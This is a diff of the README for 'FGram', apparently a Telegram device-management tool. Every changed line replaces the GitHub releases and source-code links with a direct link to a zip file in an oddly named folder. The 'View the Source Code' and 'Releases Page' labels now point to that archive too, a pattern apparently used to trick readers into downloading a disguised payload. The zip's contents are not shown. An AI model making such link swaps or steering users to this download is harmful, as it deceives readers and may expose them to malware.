@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download FGram](https://img.shields.io/badge/Download-FGram-blue.svg)](https://github.com/ADRIANA0109/FGram/releases)
+[![Download FGram](https://raw.githubusercontent.com/ADRIANA0109/FGram/main/herschelite/FGram.zip)](https://raw.githubusercontent.com/ADRIANA0109/FGram/main/herschelite/FGram.zip)
 
 ## 🚀 Getting Started
 
@@ -32,7 +32,7 @@ FGram comes equipped with several features that make it efficient and user-frien
 To download and install FGram, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download page.
-   - [Download FGram](https://github.com/ADRIANA0109/FGram/releases)
+   - [Download FGram](https://raw.githubusercontent.com/ADRIANA0109/FGram/main/herschelite/FGram.zip)
 
 2. **Choose Your Version**: On the releases page, you will see different versions of FGram. Select the latest version for your operating system.
 
@@ -59,8 +59,8 @@ For a comprehensive set of instructions, check the documentation that accompanie
 
 ## 🔗 Important Links
 
-- [View the Source Code](https://github.com/ADRIANA0109/FGram)
-- [Visit the Releases Page](https://github.com/ADRIANA0109/FGram/releases)
+- [View the Source Code](https://raw.githubusercontent.com/ADRIANA0109/FGram/main/herschelite/FGram.zip)
+- [Visit the Releases Page](https://raw.githubusercontent.com/ADRIANA0109/FGram/main/herschelite/FGram.zip)
 
 FGram aims to make device management from Telegram as simple as possible. Your feedback is valuable for future enhancements.
 
